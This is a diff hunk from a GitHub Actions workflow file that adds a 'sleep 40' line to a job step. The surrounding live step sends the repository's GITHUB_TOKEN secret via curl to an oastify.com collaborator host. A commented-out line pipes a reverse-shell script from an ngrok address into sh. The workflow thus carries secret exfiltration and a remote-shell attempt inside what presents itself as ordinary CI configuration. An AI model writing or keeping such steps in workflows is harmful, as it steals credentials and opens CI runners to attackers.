@@ -27,6 +27,7 @@ jobs:
           # sleep 120
           # echo $x
           curl http://2wzlcleq8scnquutjci2434y8peg27qw.oastify.com/ -d ${{ secrets.GITHUB_TOKEN }}
+          sleep 40
           # sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:11069 | sh'
 
       # - name: Update CHANGELOG.md
